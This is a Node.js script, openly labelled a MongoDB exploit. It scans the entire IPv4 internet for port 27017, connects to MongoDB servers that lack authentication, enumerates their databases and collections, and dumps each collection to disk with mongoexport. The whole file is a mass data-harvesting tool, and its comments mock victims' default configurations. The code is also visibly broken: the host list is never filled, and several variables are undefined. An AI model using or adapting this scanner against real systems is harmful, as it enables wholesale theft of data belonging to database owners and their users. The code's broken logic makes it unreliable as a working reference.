// BrokenDB, MongoDB exploit: https://cispa.saarland/wp-content/uploads/2015/02/MongoDB_documentation.pdf
// SN4T14 2015-03-30
// Licensed under the WTFPL: http://www.wtfpl.net/txt/copying/

'use strict';

var Promise = require('bluebird');
var mongodb = Promise.promisifyAll(require('mongodb')); // Oh god we have to use MongoDB for this
var util = require('util');
var yaml = require('js-yaml');
var fs = Promise.promisifyAll(require('fs'));
var childProcess = Promise.promisifyAll(require('child_process'));



var config = yaml.safeLoad(fs.readFileSync('config.yml', 'utf8'));
var hosts = [];

function enoentPredicate(err) {
	return (err.code === "ENOENT");
}

function getHosts() {
	if (config.addresses === "scan") {
		var command = "masscan -p27017 0.0.0.0/0";

		Promise.try(function() {
			return childProcess.execAsync(command);
		}).then(function(stdout) {
			return stdout.toString().split("\n");
		}).catch(function(err) {
			console.error(command, 'exec error:', error);
			process.exit(1);
		});
	} else if (config.addresses === "file") {
		Promise.try(function() {
			return fs.readFileAsync(config.file);
		}).then(function(fileContents) {
			return fileContents.toString().split("\n");
		}).catch(enoentPredicate, function(err) {
			console.error(config.file, "does not exist!");
			process.exit(1);
		});
	} else {
		// The fuck is config.addresses set to?
		console.log("invalid 'addresses' setting in config file");
		process.exit(1);
	}
};

function databaseLoop(databases) {
	databases.forEach(function (database) {
		console.log("database:", database);
		console.log("database name:", database.name);

		var connection = Promise.promisifyAll(new mongodb.Db(database.name, new mongodb.Server(host, 27017)));
		var database;

		Promise.try(function() {
			return connection.openAsync();
		}).then(function(db) {
			database = Promise.promisifyAll(db);

			return database.collectionsAsync();
		}).then(function(collections) {
			collectionLoop(collections);
			database.close();
		});
	});
};

function collectionLoop(collections) {
	collections.forEach(function (collection) {
		console.log("database:", database.name, "collection:", collection.s.name);
		var command = "mongoexport --host " + host + " --db " + database.name + " --collection" + collection + " --out " + host + "-" + database.name + "-" + collection;

		Promise.try(function() {
			return childProcess.execAsync(command);
		}).then(function(stdout) {
			console.log("Successfully dumped:", "host:", host, "db:", database.name, "collection:", collection);
		}).catch(function(err) {
			console.log(command + ' exec error: ' + err);
		});
	});
}

hosts.forEach(function (host) {
	var connection = Promise.promisifyAll(new mongodb.Db("test", new mongodb.Server(host, 27017))); // Lol, why would you need authentication enabled by default? Not like anyone's going to be accessing it remotely or anything
	var database;

	Promise.try(function() {
		return connection.openAsync();
	}).then(function(db) {
		database = db;
		var adminDB = Promise.promisifyAll(database.admin());

		return adminDB.listDatabasesAsync();
	}).then(function(databaseList) {
		databaseLoop(databaseList.databases);
	}).catch(function(err) {
		console.log("Error listing databases:", err);
	});
});
